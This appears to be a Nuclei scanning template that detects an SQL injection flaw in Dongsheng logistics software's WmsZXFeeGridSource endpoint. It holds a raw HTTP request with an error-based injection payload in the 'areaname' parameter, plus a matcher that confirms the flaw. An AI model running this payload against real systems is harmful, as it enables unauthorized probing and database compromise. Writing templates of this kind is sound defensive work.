id: dongshengwuliu-WmsZXFeeGridSource-sqli

info:
  name: 东胜物流软件 WmsZXFeeGridSource.asmx 存在SQL注入漏洞
  author: dongshengwuliu
  severity: high
  tags: sqli,dongshengwuliu


http:
  - raw:
      - |
        GET /WMS_ZX/WmsZXFeeGridSource.aspx?read=areaname&areaname='-1/@@version-- HTTP/1.1
        Host: 
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    matchers:
      - type: dsl
        dsl:
          - status_code==500 && contains_all(body,"nvarchar")